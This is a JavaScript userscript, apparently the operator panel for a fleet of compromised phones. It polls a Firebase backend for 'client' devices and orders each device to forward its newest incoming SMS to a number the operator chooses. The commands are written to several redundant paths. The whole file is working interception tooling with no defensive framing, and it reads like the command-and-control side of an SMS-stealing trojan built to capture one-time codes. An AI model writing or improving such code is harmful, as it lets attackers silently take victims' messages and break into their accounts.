/* ============================================================
   ANANYA SMS Forwarder v2.0 — Production Ready
   Tampermonkey logic, panel-integrated
   ============================================================ */

(function () {
    'use strict';

    console.log('[SMS-FWD] Loaded ✅');

    var ACCOUNTS_KEY = 'flixy_accounts';
    var PROCESSED_KEY = 'sms_fwd_done_v2';
    var POLL_INTERVAL = 100;  // 1 second — safe for Firebase

    // ============ ACCOUNTS ============
    function getAccounts() {
        try {
            var s = localStorage.getItem(ACCOUNTS_KEY);
            return s ? JSON.parse(s) : [];
        } catch (e) { return []; }
    }

    // ============ FIREBASE HELPERS ============
    async function fbGet(base, key, path) {
        try {
            var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
            var r = await fetch(url);
            if (!r.ok) return null;
            return await r.json();
        } catch (e) { return null; }
    }

    async function fbPut(base, key, path, data) {
        try {
            var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
            var r = await fetch(url, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return r.ok;
        } catch (e) { return false; }
    }

    async function fbPush(base, key, path, data) {
        try {
            var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
            var r = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return r.ok;
        } catch (e) { return false; }
    }

    // ============ PROCESSED TRACKER ============
    var processed = new Set();
    try {
        var saved = JSON.parse(localStorage.getItem(PROCESSED_KEY) || '[]');
        for (var i = 0; i < saved.length; i++) processed.add(saved[i]);
    } catch (e) {}

    function markDone(k) {
        processed.add(k);
        try {
            var arr = Array.from(processed).slice(-1000);
            localStorage.setItem(PROCESSED_KEY, JSON.stringify(arr));
        } catch (e) {}
    }

    // ============ CORE — HANDLE DEVICE ============
    async function handleDevice(acc, devId) {
        try {
            // 1. Check forwarding config
            var cfg = await fbGet(acc.url, acc.key, 'clients/' + devId + '/smsForwarding');
            if (!cfg) return;
            if (!cfg.enabled) return;
            if (!cfg.forwardTo) return;

            // 2. Get messages
            var msgs = await fbGet(acc.url, acc.key, 'messages/' + devId);
            if (!msgs || typeof msgs !== 'object') return;

            var ids = Object.keys(msgs);
            if (!ids.length) return;
            ids.sort(function (a, b) { return Number(a) - Number(b); });
            var newest = ids[ids.length - 1];

            // 3. Check if already processed
            var k = devId + '_' + newest;
            if (processed.has(k)) return;

            var sms = msgs[newest];
            if (!sms) { markDone(k); return; }
            if (sms.type !== 'incoming') { markDone(k); return; }

            var text = sms.message || sms.body || sms.text || '';
            if (!text) { markDone(k); return; }

            // 4. Prepare forward payload (SAME AS TAMPERMONKEY)
            var to = String(cfg.forwardTo).replace(/[^0-9]/g, '');
            var ts = Date.now();
            var cid = 'fwd_' + ts + '_' + Math.random().toString(36).slice(2, 8);
            var sim = { simSlot: cfg.simSlot != null ? cfg.simSlot : (cfg.sim || 0) };

            console.log('[SMS-FWD] 📤 Forwarding:', sms.sender, '→', to);

            // 5. Write to Firebase — 4 PATHS (SAME AS TAMPERMONKEY + BOT 2.js)
            // PATH 1: webhookEvent/sendSms — device reads this and sends SMS
            await fbPut(acc.url, acc.key, 'clients/' + devId + '/webhookEvent/sendSms', {
                to: to,
                message: text,
                isSended: false,
                timestamp: ts,
                commandId: cid,
                simInfo: sim,
                forwarded: true,
                originalSender: sms.sender || 'Unknown'
            });

            // PATH 2: commands/sendSms — backup
            await fbPut(acc.url, acc.key, 'clients/' + devId + '/commands/sendSms', {
                targetNumber: to,
                message: text,
                timestamp: ts,
                status: 'pending',
                id: cid,
                simInfo: sim,
                forwarded: true
            });

            // PATH 3: messages — log entry
            await fbPush(acc.url, acc.key, 'clients/' + devId + '/messages', {
                sender: 'FORWARDER',
                message: 'Fwd to ' + to + ': ' + String(text).slice(0, 200),
                dateTime: ts,
                timestamp: ts,
                type: 'outgoing',
                targetNumber: to,
                commandId: cid,
                status: 'pending',
                simInfo: sim,
                forwarded: true
            });

            // PATH 4: sms — extra fallback
            await fbPut(acc.url, acc.key, 'clients/' + devId + '/sms', {
                to: to,
                text: text,
                timestamp: ts,
                status: 'pending',
                commandId: cid,
                forwarded: true
            });

            markDone(k);
            console.log('[SMS-FWD] ✅ Forwarded:', sms.sender, '→', to);

        } catch (e) {
            console.error('[SMS-FWD] Error:', e.message);
        }
    }

    // ============ MAIN LOOP ============
    var busy = false;

    async function tick() {
        if (busy) return;
        busy = true;
        try {
            var accs = getAccounts();
            for (var i = 0; i < accs.length; i++) {
                var acc = accs[i];
                if (!acc.url || !acc.key) continue;

                var clients = await fbGet(acc.url, acc.key, 'clients');
                if (!clients || typeof clients !== 'object') continue;

                var devIds = Object.keys(clients);
                for (var j = 0; j < devIds.length; j++) {
                    await handleDevice(acc, devIds[j]);
                }
            }
        } finally {
            busy = false;
        }
    }

    // ============ START ============
    setInterval(tick, POLL_INTERVAL);
    setTimeout(tick, 1500);  // Start after 1.5s

    console.log('[SMS-FWD] Running every', POLL_INTERVAL, 'ms 🚀');
    console.log('[SMS-FWD] Panel ke browser me chalta rahega — browser band na karo!');

})();
